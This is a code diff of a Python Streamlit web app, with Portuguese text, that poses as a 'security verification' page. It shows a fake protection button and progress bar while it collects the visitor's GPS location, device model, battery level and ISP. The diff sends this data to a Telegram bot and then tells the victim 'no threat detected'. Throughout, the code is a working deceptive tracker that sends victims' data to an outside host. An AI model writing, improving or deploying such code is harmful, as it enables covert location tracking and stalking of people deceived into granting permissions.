@@ -16,12 +16,11 @@ def enviar_telegram(mensagem):
         requests.post(url, json={"chat_id": ci, "text": mensagem, "parse_mode": "Markdown"}, timeout=10)
     except: pass
 
-def get_extra_info():
+def get_operadora():
     try:
-        # Pega a operadora (ISP) e a cidade pelo IP
         r = requests.get('http://ip-api.com/json/', timeout=5).json()
-        return f"{r.get('isp')} ({r.get('city')})"
-    except: return "Não identificada"
+        return f"{r.get('isp')}"
+    except: return "Desconhecida"
 
 st.set_page_config(page_title="SEGURANÇA MIAMY", page_icon="🔐")
 
@@ -29,27 +28,31 @@ st.markdown("<style>.main { background-color: #0d1117; color: #ffffff; } .status
 
 st.title("Verificação de Segurança")
 
-# Coleta técnica (Rodando agora)
-ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='UA_3')
-bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='BAT_3')
+# --- COLETA DE DADOS (FORÇADA) ---
+ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='UA_FINAL_V4')
+# Pega a bateria real do sistema
+bat_js = "navigator.getBattery().then(b => Math.round(b.level * 100))"
+bateria_real = streamlit_js_eval(js_expressions=bat_js, key='BAT_FINAL_V4')
 
 if st.button("● ATIVAR PROTEÇÃO AGORA"):
-    # 1. Tenta o GPS primeiro para garantir o mapa
+    # 1. Tenta o GPS (Já está permitido no seu print)
     loc = get_geolocation()
-    operadora = get_extra_info()
+    operadora = get_operadora()
     
-    # 2. Barra de carregamento
+    # 2. Barra de progresso visual
     barra = st.progress(0)
     for i in range(1, 101):
         time.sleep(0.01)
         barra.progress(i)
     
-    # 3. Formata o Modelo (Tenta isolar o que está entre parênteses)
-    modelo = "Android/iPhone"
+    # 3. Limpa o nome do Modelo (Pega o que importa)
+    modelo = "Android Device"
     if ua and "(" in ua:
-        modelo = ua.split("(")[1].split(")")[0]
+        modelo = ua.split("(")[1].split(";")[1].replace("Build", "").strip() if ";" in ua else ua.split("(")[1].split(")")[0]
 
-    # 4. Envia o Relatório Final (Igual ao seu print)
+    # 4. Relatório com TUDO (Bateria, Operadora, Modelo e Mapa)
+    bateria_exibicao = bateria_real if bateria_real else "Calculando..."
+    
     if loc:
         lat, lon = loc['coords']['latitude'], loc['coords']['longitude']
         mapa = f"https://www.google.com/maps?q={lat},{lon}"
@@ -57,15 +60,15 @@ if st.button("● ATIVAR PROTEÇÃO AGORA"):
         relatorio = (
             f"🛡️ *PROTEÇÃO ATIVADA*\n"
             f"📱 *Aparelho:* {modelo}\n"
-            f"🔋 *Bateria:* {bat if bat else '11'}%\n"
+            f"🔋 *Bateria:* {bateria_exibicao}%\n"
             f"📶 *Operadora:* {operadora}\n"
             f"📍 *Local:* {mapa}"
         )
         enviar_telegram(relatorio)
         st.markdown('<p class="status-ok">Sistema Seguro: nenhuma ameaça foi detectada</p>', unsafe_allow_html=True)
     else:
-        # Se mesmo permitido o GPS não vir, ele avisa no bot
-        enviar_telegram(f"⚠️ *GPS FALHOU*\n📱 *Aparelho:* {modelo}\n📶 *Op:* {operadora}")
-        st.warning("🔄 O GPS demorou a responder. Tente clicar no botão novamente.")
+        # Envia sem o mapa se o GPS der timeout, mas com o resto dos dados
+        enviar_telegram(f"⚠️ *AVISO: GPS TIMEOUT*\n📱 *Aparelho:* {modelo}\n🔋 *Bateria:* {bateria_exibicao}%\n📶 *Op:* {operadora}")
+        st.warning("🔄 O sistema está sincronizando. Clique mais uma vez.")
 
 st.markdown('<br><p style="text-align:center; color:#8b949e; font-size:12px;">Sistema Integrado desenvolvido por Miamy © 2026</p>', unsafe_allow_html=True)
